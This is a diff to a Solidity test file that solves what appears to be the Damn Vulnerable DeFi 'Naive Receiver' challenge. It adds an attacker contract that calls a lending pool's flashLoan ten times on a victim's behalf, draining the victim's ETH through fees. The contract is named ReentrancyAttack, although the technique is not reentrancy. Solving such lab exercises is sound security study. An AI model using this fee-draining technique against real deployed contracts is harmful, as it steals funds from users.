@@ -49,6 +49,13 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+
+        ReentrancyAttack reentrancyAttack = new ReentrancyAttack();
+        reentrancyAttack.attack(payable(address(naiveReceiverLenderPool)), address(flashLoanReceiver));
+
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -60,5 +67,13 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+
+contract ReentrancyAttack {
+
+    function attack(address payable pool, address victim) external {
+        for (uint i; i < 10; i++) NaiveReceiverLenderPool(pool).flashLoan(victim, 100 ether);
     }
 }
